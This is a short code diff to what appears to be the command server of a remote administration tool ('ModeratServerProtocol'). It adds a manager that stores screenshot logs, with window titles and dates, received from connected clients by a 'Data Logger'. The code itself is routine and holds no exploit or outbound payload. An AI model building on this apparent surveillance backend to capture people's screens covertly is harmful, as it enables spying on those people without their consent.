@@ -3,6 +3,7 @@ from twisted.internet import reactor
 
 from ClientsManagment import ClientsManagment
 from ModeratorsManagment import ModeratorsManagment
+from ScreenshotsManager import ScreenshotsManager
 
 from PhotoFactory import save_image
 
@@ -33,9 +34,9 @@ fh = logging.handlers.RotatingFileHandler(LOGFILE, maxBytes=(1048576*5), backupC
 fh.setFormatter(format)
 log.addHandler(fh)
 
-
 manageClients = ClientsManagment()
 manageModerators = ModeratorsManagment()
+manageScreenshots = ScreenshotsManager()
 
 # Clear Clients Status
 manageClients.set_status_zero()
@@ -152,7 +153,8 @@ class ModeratServerProtocol(Protocol):
         # Data Logger
         elif mode == 'screenshotLogs':
             screen_info = ast.literal_eval(payload)
-            save_image(screen_info, key, DATA_STORAGE)
+            screen_path, name, window_title, date = save_image(screen_info, key, DATA_STORAGE)
+            manageScreenshots.save_image(key, name, screen_path, window_title, date)
             log.info('Screenshot Saved (%s)' % key)
 
         elif moderators.has_key(session_id):
